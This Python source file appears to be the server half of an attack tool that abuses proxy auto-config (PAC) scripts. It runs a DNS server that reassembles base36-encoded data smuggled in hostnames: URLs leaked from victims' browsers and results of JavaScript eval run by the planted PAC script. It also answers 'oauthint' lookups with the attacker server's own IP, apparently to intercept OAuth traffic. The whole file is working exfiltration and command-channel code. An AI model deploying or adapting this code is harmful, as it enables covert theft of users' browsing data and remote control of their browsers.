from dnslib.proxy import ProxyResolver, PassthroughDNSHandler
from dnslib.server import DNSLogger, DNSHandler, DNSServer
from dnslib import DNSRecord,RCODE,RR,QTYPE,A
import time
import socket
import fcntl
import struct

URL_SUFFIX = 'u'
RET_SUFFIX = 'r'

decode_cache = {}

# Decode a hostname received from the PAC script
# The hostname should end in either .u (for leaked URLs) or .r (for eval results)
def pac_dns_decode(hostname):
    bits = hostname.split('.')
    if len(bits) < 4:
        return None
    tld = bits.pop()
    if tld != URL_SUFFIX and tld != RET_SUFFIX:
        return None
        
    total_parts = int(bits.pop())
    part_no = int(bits.pop())
    msg_no = bits.pop()
    pac_sid = bits.pop()
    encoded_data = ''.join(bits)

    msg_id = '{0:s}_{1:s}'.format(pac_sid, msg_no)
    if msg_id not in decode_cache:
        decode_cache[msg_id] = [None] * total_parts

    # base36 decode
    decoded_part = ''
    for chunk in [encoded_data[i : i + 10] for i in range(0, len(encoded_data), 10)]:
        n = int(chunk, 36)
        decoded_part += ''.join([chr((n >> (i * 8)) & 0xff) for i in range(5, -1, -1)]).strip("\x00")

    decode_cache[msg_id][part_no] = decoded_part
    if all(decode_cache[msg_id]): # we have all the parts of the message
        decoded_data = ''.join(decode_cache[msg_id][::-1]) #Needs reversing
        del decode_cache[msg_id]
        d =  dict(total_parts=total_parts, part_no=part_no, msg_no=msg_no, pac_sid=pac_sid, tld=tld, data=decoded_data)
        return d # return full message
    # return message part
    return dict(total_parts=total_parts, part_no=part_no, msg_no=msg_no, pac_sid=pac_sid, tld=tld)

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

class PACDNSResolver(ProxyResolver):
    def __init__(self, server, port, timeout, queue=None, ifname='eth0'):
        super(PACDNSResolver, self).__init__(server, port, timeout)
        self.server_ip = get_ip_address(ifname)
        self.queue = queue

    def resolve(self, request, handler):
        qname = str(request.get_q().get_qname())[:-1]
        if qname.endswith(URL_SUFFIX) or qname.endswith(RET_SUFFIX): # it's a DNS-encoded message (part) from our PAC script
            info = pac_dns_decode(qname)
            if info and 'data' in info and self.queue: # we have a complete message
                if info['tld'] == URL_SUFFIX:
                    channel = 'url'
                elif info['tld'] == RET_SUFFIX:
                    channel = 'eval'
                item = dict(type=channel, data=info['data'], pac_sid=info['pac_sid'])
                self.queue.put(item)
            reply = request.reply()
            reply.header.rcode = getattr(RCODE, 'NXDOMAIN')
        elif qname.startswith('oauthint'): # oauthint.foo.com will resolve to IP of this server
            reply = request.reply()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.server_ip)))
        else:
            reply = super(PACDNSResolver, self).resolve(request, handler)
        return reply

class PACDNSServer():
    def __init__(self, server, port=53, queue=None, ifname='eth0'):
        resolver = PACDNSResolver(server, port, timeout=5, queue=queue, ifname=ifname)
        handler = DNSHandler
        logger = DNSLogger("request", False)
        self.udp_server = DNSServer(resolver, logger=logger, handler=handler)

    def start(self, no_exit=False):
        self.udp_server.start_thread()
        while no_exit and self.udp_server.isAlive():
            time.sleep(1)

